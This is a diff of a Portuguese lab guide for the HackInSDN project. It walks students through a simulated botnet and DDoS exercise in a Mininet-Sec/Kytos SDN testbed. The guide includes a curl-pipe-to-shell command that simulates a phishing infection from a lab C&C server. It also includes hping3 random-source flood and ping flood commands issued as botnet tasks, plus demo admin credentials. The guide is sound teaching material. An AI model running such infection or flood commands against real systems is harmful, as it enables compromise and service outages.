@@ -18,16 +18,28 @@ Antes de iniciar o cenário de orquestração, execução e contenção dos ataq
 
 Você deve observar que uma nova aba no navegador é aberta com a topologia do Mininet-Sec conforme ilustrado abaixo:
 
+![lab04-ddos-mnsec-topo.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-mnsec-topo.png)
 
- ping from h1 to srv1: falha
+Nessa tela, faça um duplo clique no host **h1** e observe que uma nova aba será aberta com o terminal do h1.
 
-2. configurar Kytos com of-l2ls
+No terminal do h1, execute um teste de conectividade para o srv1 com o comando ping:
+```
+ping -c4 192.168.1.254
+```
+
+Observe que o retorno do teste será uma falha indicando que o host está inalcançável, conforme ilustrado abaixo:
+
+![lab04-ddos-h1-ping-srv1-fail.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-h1-ping-srv1-fail.png)
+
+Essa falha ocorre pois precisamos configurar o controlador SDN para fornecer conectividade entre os hosts.
+
+2. Para configurar a conectivdade entre os hosts da organização HackInSDN.com, vamos utilizar uma aplicação simples no Orquestrador SDN Kytos-ng que funciona como [Switch L2](https://github.com/kytos-ng/of_l2ls/). Para isso, abra o terminal do host **c1** na topologia do Mininet-Sec com um duplo clique e execute os seguintes comandos:
 
 ```
 ip netns exec mgmt python3 -m pip install -e git+https://github.com/kytos-ng/of_l2ls#egg=kytos-of-l2ls
 ```
 
-Reiniciar o Kytos:
+E então entre com os seguintes comandos para reiniciar o Kytos:
 ```
 tmux send-keys -t kytos "exit" ENTER
 sleep 5
@@ -35,73 +47,162 @@ pkill -9 kytosd
 tmux new-session -d -s kytosserver "kytosd -f -E"
 ```
 
-3. ping novamente: okay
+3. De volta ao terminal do host **h1** execute novamente o teste de PING e observe agora a conectividade está operacional:
+```
+ping -c4 192.168.1.254
+```
 
-4. curl http://192.168.1.254
+É possível que o primeiro pacote seja "perdido" pois o controlador SDN Kytos precisa de um tempo para fazer a descoberta da porta e configuração das regras OpenFlow.
 
-5. testar com ali a partir do h1: ali --timeout 2s --duration 0 http://192.168.1.254
+4. Ainda no host **h1**, execute também um teste de acesso ao site do HackInSDN.com na linha de comando com o seguinte comando:
+```
+curl http://192.168.1.254
+```
 
-6. Abrir o console do Mininet-Sec na interface do Dashboard e rodar o comando dstat:
+A saída esperada é mostrada abaixo (a saída abaixo inclui o teste do ping e também do curl):
+
+![lab04-ddos-h1-ping-srv1-ok.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-h1-ping-srv1-ok.png)
+
+
+5. Ainda no host **h1**, vamos utilizar uma ferramenta de teste contínuo e _benchmarking_ para as requisições HTTP. A ferramenta utilizada será o **ali** (https://github.com/nakabonne/ali), que pode ser executada com o seguinte comando no terminal do host h1:
+```
+ali --timeout 2s --duration 0 http://192.168.1.254
+```
+
+Após executar o comando acima, você deve pressionar a tecla ENTER para iniciar o processo de coleta. A saída esperada do ali é mostrada abaixo:
+
+![lab04-ddos-h1-ali.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-h1-ali.png)
+
+6. Por fim, vamos também executar uma ferramenta de coleta de estatísticas do tráfego de rede. Essas estatísticas serão utilizadas ao longo desse laboratório para entender o comportamento dos ataques. Para monitorar as estatísticas de rede, abro o terminal do Mininet-Sec na interface do Dashboard, conforme mostrado abaixo:
+
+![lab04-ddos-resources-dashboard-term-mnsec.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-resources-dashboard-term-mnsec.png)
+
+No terminal do Mininet-Sec, rodar o comando dstat:
 
 ```
 dstat --bits -t -n -N s1-eth8
 ```
 
-Confirmar na interface do Mininet-Sec que a interface s1-eth8 é a interface que conecta o srv1 com o s1.
+A saída esperada é mostrada abaixo:
 
-Comentar sobre o tráfego que é observado com o uso do software "ali".
+![lab04-ddos-mnsec-dstat.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-mnsec-dstat.png)
+
+O comando acima irá monitorar as estatísticas de rede da interface **s1-eth8** que deve ser a interface conectando o switch **s1** com o host **srv1**.
+
+Ao observar a saída acima podemos notar que o tráfego enviado gira em torno de 90Kbps e o tráfego recebido gira em torno de 170Kbps. O tráfego em questão é resultante do benchmark executado pela ferramenta "ali" que gera cerca de 50 requisições por segundo, resultando em um tráfego enviado de 90Kbps, sendo a resposta com o conteúdo HTML correspondente ao tráfego recebido de 170Kbps.
+
+Por fim, caso você deseje confirmar que a interface **s1-eth8** é a interface correta que conecta **s1** e **srv1**, volte para a aba que mostra a topologia do Mininet-Sec e clique no link entre os dois elementos:
+
+![lab04-ddos-mnsec-link-s1-srv1.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-mnsec-link-s1-srv1.png)
+
 
 ## Atividade 2 - Orquestrando a formação da botnet
 
-TODO: apresentar o cenário
+Para executar um ataque de DDoS, tipicamente os atacacantes lançam mão de uma **botnet** que trabalha de forma orquestrada para remotamente disparar um envio em massa de requisições maliciosas para indisponibilizar um serviço. Uma botnet é uma rede formada por centenas/milhares de bots, ou computadores **zumbis**, que consistem em dispositivos conectados à Internet que estão infectados com malware e podem ser controlados remotamente para disparar ataques, potencializando a ação danosa dos atacantes. A botnet possui um Controlador, também conhecido como **master** ou **C&C** (ou também c2c), que é um computador utilizado para orquestrar o funcionamento dos **zumbis** ou **bots** para realizar determinado ataque. Nessa seção, vamos ilustrar o processo de formação da botnet e o funcionamento do C&C.
 
-1. Acessar o link do servico "http c2c" e falar sobre a pagina, falar sobre o risco de executar um script qualquer e ser infectado, falar que algumas pessoas foram infectadas
+1. Para fins didáticos e ilustrativos, este laboratório inclui um sistema de Controlador da Botnet, que pode ser acessado através do link do serviço "http c2c" no Dashboard:
 
-2. Modificar a URL e adicionar um /admin no final, logar com usuario "admin" e senha "hackinsdn"
+![lab04-ddos-resources-dashboard-c2c.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-resources-dashboard-c2c.png)
 
-3. Verificar os hosts que são mostrados, explicar que tratam-se de hosts infectados e funcionando como zumbis para efetuar ataques futuros.
+Ao carregar a página do controlador, você visualizará um conteúdo similar ao mostrado abaixo:
 
-4. Realizar um teste de ping para visualizar o volume gerado pelos hosts infectados.
+![lab04-ddos-c2c-phishing.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-c2c-phishing.png)
 
+Essa é uma página ilustrativa com um golpe de fraude eletrônica (_Phishing_) que visa iludir o usuário a acreditar que está instalando um software seguro mas está instalando na verdade um malware, transformando seu computador em um **bot**. Para isso, a página instrui o usuário a copiar e executar um comando no seu computador (**Atenção:** este é um dos riscos de instalar software de procedência desconhecida, ou executar comandos em sites sem confiança).
+
+Em particular, no cenário ilustrativo e didático desse laboratório, vamos assumir que algumas pessoas foram vítimas desse golpe e vamos simular dois computadores sendo também infectados.
+
+2. Volte ao Dashboard HackInSDN e clique novamente no serviço "http c2c" para abrir uma nova aba. Dessa vez, na aba aberta, modifique a URL e adicione um /admin no final. Deve aparecer uma tela solicitando login e senha, logar com usuario "admin" e senha "hackinsdn". Abaixo uma ilustração:
+
+![lab04-ddos-c2c-admin-login.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-c2c-admin-login.png)
+
+3. Na tela seguinte você visualizará um suposto console do C&C, onde pode verificar uma tabela com hosts infectados e que atuam como **bots** nessa botnet fictícia:
+
+![lab04-ddos-c2c-admin-view.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-c2c-admin-view.png)
+
+Faça o refresh da página e observe que a coluna "Last seen" indica que os bots estão online e se comunicando com o c2c.
+
+4. Em seguida vamos realizar um teste para comprovar que os hosts da botnet podem ser utilizados para efetur ataques de forma didática e ilustrativa. Para isso vamos utilizar o simples comando ping e visualizar o volume gerado pelos hosts infectados. Ainda na interface admin da console c2c preencha os campos abaixo:
+
+- When: **30**
+- Task:
 ```
 timeout 60 ping -s 972 192.168.1.254
 ```
+- Em seguida clique em "Submit"
 
-5. Mostrar como o h6 seria infectado, abrir o console do h6 e copiar o comando para supostamente instalar a VPN. Após executado, voltar a interface admin da botnet/command-and-controller e visualizar o h6 agora também infectado
+Abaixo uma ilustração:
+
+![lab04-ddos-c2c-admin-create-tasks.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-c2c-admin-create-tasks.png)
+
+Em seguida, recarregue a página e observe que todos os **bots** já obtiveram a tarefa e vão iniciar a execução em alguns segundos.
+
+![lab04-ddos-c2c-admin-zumbie-tasks.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-c2c-admin-zumbie-tasks.png)
+
+5. Volte à aba que estava mostrando as estatísticas de tráfegoccom dstat e observe que a média de tráfego enviado e recebido aumentou em cerca de 30Kbps cada:
+
+![lab04-ddos-mnsec-dstat-task-ping.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-mnsec-dstat-task-ping.png)
+
+Isso ocorre pois cada **bot** envia 1000 bytes (972 do payload ICMP + 8 dos cabeçalhos ICMP + 20 dos cabeçalhos IP) e temos 4 **bots** ativos: 1000 x 4 x 8 = 32000 bps ou 30Kbps.
+
+6. Em seguida vamos ilustrar o processo de infecção de um host. Para issu acesse o terminal do h6 com um duplo clique sobre o h6 na topologia do Mininet-Sec. Vamos assumir que o usuário que estava no h6 acreditou no site de phishing da botnet, copiou o comando e executou na sua máquina. No terminal do h6 execute o seguinte comando:
 
 ```
 curl -sfL http://192.168.1.250:5000/s/download-vpn | sh
 ```
 
-Saída do portal de c2c
+Saída esperada é mostrada abaixo:
 
-Saída do ps aux
+![lab04-ddos-host-infection-h6.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-host-infection-h6.png)
 
-6. Repetir o mesmo processo com o h8
+Na console admin do c2c, após um refresh da página podemos visualizar que o h6 agora também faz parte da botnet:
+
+![lab04-ddos-c2c-h6-zumbi.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-c2c-h6-zumbi.png)
+
+Ainda no terminal do h6, liste os processos em execução com o seguinte comando:
+```
+ps aux
+```
+
+A saída esperada é ilutrada a seguir:
+
+![lab04-ddos-list-processes-infected-host.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-list-processes-infected-host.png)
+
+A lista de processos acima levanta alguma suspeita?
+
+
+6. Repetir o mesmo processo com o h8. A partir do terminal do host h8, executar:
 
 ```
 curl -sfL http://192.168.1.250:5000/s/download-vpn | sh
 ```
 
-Saída esperada:
+7. De volta a aba da console admin do C2C, repita o teste de ping para visualizar o volume gerado pelos hosts infectados:
 
+- When: `30`
+- Task: `timeout 60 ping -s 972 192.168.1.254`
 
-7. Repetir o teste de ping para visualizar o volume gerado pelos hosts infectados
-
+Na tela do DSTAT, observe agora o volume de tráfego subindo para algo em torno de 225Kbps de saída e 140Kbps de entrada
 
 ## Atividade 3 - Executando ataques de DDoS volumétrico
 
-1. Na aba que está com o console do Mininet-Sec exibindo estatísticas de rede do srv1 com o dstat, checar que o volume está baixo e em conformidade com o uso da ferramenta "ali"
+1. Como já observamos anteriormente, as estatísticas de rede com a ferramenta DSTAT mostram que em consições normais o volume de tráfego do host **srv1** gira em torno de 170Kbps de saída e 90Kbps de entrada. O volume está baixo e em conformidade com o uso da ferramenta de benchmark "ali". Confirme a visualização das estatísticas no terminal do Mininet-Sec que está executando o comando "dstat".
 
-2. Recarregar a interface do C2C e checar que todos os hosts infectados continuam ativos
+2. Volte a interface console admin C2C e confirme que todos os hosts infectados continuam ativos, você deve visualizar 6 bots ativos (h2, h4, h5, h6, h8, h9) -- observe os endereços IPs especialmente o último octeto e também a coluna "Last seen".
 
-3. Na seção de Tasks, cadastrar uma nova Task para executar em 30 segundos com o seguinte comando:
+3. Na seção de Tasks, cadastrar uma nova Task para executar um ataque de DDoS volumétrico pelos **bots**:
 
+- When: `30`
+- Task:
 ```
 timeout 120 hping3 -d 1200 -p 80 -i u250 --rand-source 192.168.1.254
 ```
 
-4. Observar o volume de tráfego gerado para o srv1
+O comando acima vai executar um volume de tráfego muito grande a partir de cada bot. Além disso, os endereços IPs do tráfego serão aleatórios dificultando as ações de segurança.
+
+4. Na aba com o DSTAT, observar o volume de tráfego gerado para o srv1:
+
+![lab04-ddos-dstat-ddos-vol.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-dstat-ddos-vol.png)
 
 5. Na aba do h1 que está com o "ali" em execução, observar as requisições com falha de timeout
 
